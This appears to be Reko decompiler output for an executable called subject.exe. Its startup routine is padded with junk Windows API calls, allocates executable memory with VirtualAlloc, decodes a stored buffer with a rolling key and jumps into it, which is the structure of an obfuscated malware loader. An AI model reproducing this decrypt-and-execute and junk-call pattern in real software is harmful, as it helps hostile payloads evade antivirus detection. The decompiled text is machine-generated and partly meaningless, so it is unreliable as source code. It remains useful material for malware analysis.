// subject.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

// 00401278: Register Eq_2 Win32CrtStartup()
Eq_2 Win32CrtStartup()
{
	GetCPInfo(ecx & 0x00, fp - 0x0100);
	GetCurrentProcessId();
	GetCurrentThreadId();
	RegEnumKeyExA(fp - 0x5C, 0x12, 0x00, fp - 0x60, fp - 0x8C, fp - 116, fp - 0xCC, (struct _FILETIME *) 0x02);
	OpenMutexA(0x15, 0x00, fp - 0x70);
	RegEnumValueW(fp - 0xA8, 0x08, (WCHAR *) 0x17, fp - 0xC0, fp - 0xA4, fp - 0xA4, fp - 0x7C, 0x00);
	Eq_2 edx_105 = fp - 0xC0 & 0x00;
	OpenEventA(edx_105 & 0x0D, edx_105, fp - 0x80);
	Eq_2 eax_125 = InitializeAcl(fp - 0x5C, 0x13, 0x12);
	Eq_108 ecx_128 = fp - 0xA4 - dwLoc0104;
	if (ecx_128 != 0x0386)
		ecx_128 = ecx_128 + eax_125 + (ecx_128 <u 0x0386) | 12277;
	malloc(0x00);
	Eq_2 ecx_189 = fp - 88 & 0x00;
	Eq_48 eax_196 = RegEnumKeyExA(fp - 0x7C, ecx_189, 0x00, fp - 88, fp - 0xA8, fp - 0xAC, fp - 0xAC, (struct _FILETIME *) 0x14);
	ui32 ecx_201 = ecx_189 & eax_196 | fp - 0xAC;
	word32 esp_204;
	word32 ebp_205;
	byte SCZO_206;
	word32 edx_207;
	byte Z_208;
	word32 eax_209;
	byte SZO_210;
	byte C_211;
	word32 ecx_212;
	Eq_2 ebx_213;
	Eq_2 esi_214;
	Eq_2 edi_215;
	_set_app_type();
	OpenMutexA(((eax_209 ^ dwArg02) + 0x0861 | 0x3FC7) & 0x00, 0x00, fp - 0xC0);
	GetCPInfo(RegOpenKeyA(fp - 0x78, fp - 212, fp - 0x84) & 0x00, fp - 0xD8);
	(fp - 844)->u0 = 0x00;
	*(fp - 848) = fp - 0x04;
	*(fp - 848) = *(fp - 848) - 100;
	(fp - 0x0354)->u0 = 0x0A;
	*(fp - 0x0358) = fp - 0xC4;
	RegEnumKeyA(*(fp - 0x0358), *(fp - 0x0354), *(fp - 848), *(fp - 844));
	GetOEMCP();
	(fp - 0x035C)->u0 = 0x0A;
	*(fp - 0x0360) = fp - 0x78;
	(fp - 868)->u0 = 0x00;
	*(fp - 0x0368) = fp - 0xF0;
	RegEnumKeyA(*(fp - 0x0368), *(fp - 868), *(fp - 0x0360), *(fp - 0x035C));
	*(fp - 0x036C) = fp - 0x04;
	*(fp - 0x036C) = *(fp - 0x036C) - 0x8C;
	(fp - 880)->u0 = 0x00;
	(fp - 884)->u0 = 0x0A;
	Eq_349 ecx_311 = fp - 0x0288;
	if (OpenMutexA(*(fp - 884), *(fp - 880), *(fp - 0x036C)) == null)
		ecx_311 = (fp - 15441 | dwLoc94) ^ 0x1662;
	*(fp - 888) = fp - 0x04;
	*(fp - 888) = *(fp - 888) - 0xC4;
	*(fp - 0x037C) = fp - 0x04;
	*(fp - 0x037C) = *(fp - 0x037C) - 0xB8;
	*(fp - 0x0380) = fp - 0xEC;
	RegOpenKeyA(*(fp - 0x0380), *(fp - 0x037C), *(fp - 888));
	if (ecx_311 != 0x00)
		ecx_311 = fp - 0x04;
	GetLastError();
	(fp - 900)->u0 = 0x00;
	(fp - 0x0388)->u0 = 0x00;
	(fp - 0x038C)->u0 = 0x00;
	Eq_454 eax_377 = CreateItemMoniker(*(fp - 0x038C), *(fp - 0x0388), *(fp - 900));
	ui32 ecx_373 = ecx_311 | 0x306C;
	ui32 eax_378 = eax_377 ^ 0x80070057;
	if ((eax_377 ^ 0x80070057) == 0x00)
	{
		*(fp - 0x0390) = fp - 0x0B4E;
		Eq_2 ecx_452 = ecx_373 | dwArg0A;
		*(fp - 0x0394) = ecx_452;
		*(fp - 0x0398) = fp - 0x04;
		*(fp - 0x039C) = ebx_213;
		*(fp - 0x03A0) = fp - 0x038C;
		*(fp - 0x03A4) = fp - 0x04;
		*(fp - 0x03A8) = esi_214;
		*(fp - 0x03AC) = edi_215;
		(fp - 944)->u0 = 0x40;
		(fp - 0x03B4)->u0 = 0x1000;
		(fp - 0x03B8)->u0 = 0x3000;
		(fp - 0x03BC)->u0 = 0x00;
		Eq_2 eax_498 = VirtualAlloc(*(fp - 0x03BC), *(fp - 0x03B8), *(fp - 0x03B4), *(fp - 944));
		struct Eq_586 * edx_513 = &globals->t40A55C;
		Eq_2 esi_525 = eax_498;
		word32 dwLoc0230_531 = 1839877483;
		Eq_591 ecx_534 = ((fp - 0x04 | dwLoc01CC) ^ dwLoc01CD) - (fp - 0x01D4) + dwLoc023B;
		if ((fp - 0x023C | 0x34FC) == dwLoc024C)
			ecx_534 = fp - 400 ^ 0x030E;
		do
		{
			word32 edi_558 = edx_513->dw0000 + dwLoc0230_531;
			*esi_525 = edi_558;
			dwLoc0230_531 = dwLoc0230_531 + 3713120415;
			Eq_625 edx_569 = (char *) edx_513 - 810971396;
			word32 ebx_572 = fp - 0xB0 + ecx_534 + (edx_569 <u 0x00);
			Eq_635 eax_573 = fp - 0x04;
			ui32 ecx_579 = (ecx_534 | dwArg0C) + dwArg0C ^ dwLoc02;
			word32 esi_580 = esi_525 + 1332391190;
			edx_513 = edx_569 + 810971400;
			if (ebx_572 == 0x0245)
				eax_573 = (word32) fp + 0x000020B0 & 0x06A9;
			esi_525 = esi_580 + 0xB09552EE;
			ecx_534 = ecx_579 + 0x0EA7 ^ 0x2367;
		} while (edx_569 != 806730588);
		word32 esp_613;
		word32 ebp_614;
		byte SCZO_615;
		word32 edx_616;
		byte Z_617;
		byte SZO_619;
		Eq_670 C_620;
		word32 ecx_621;
		word32 ebx_622;
		word32 esi_623;
		word32 edi_624;
		eax_498();
		if (ebx_622 == ((word32) C_620 + (ecx_621 + ebx_622)) - ebx_622)
			eax_378 = eax_378 | dwLocAC;
	}
	return eax_378;
}

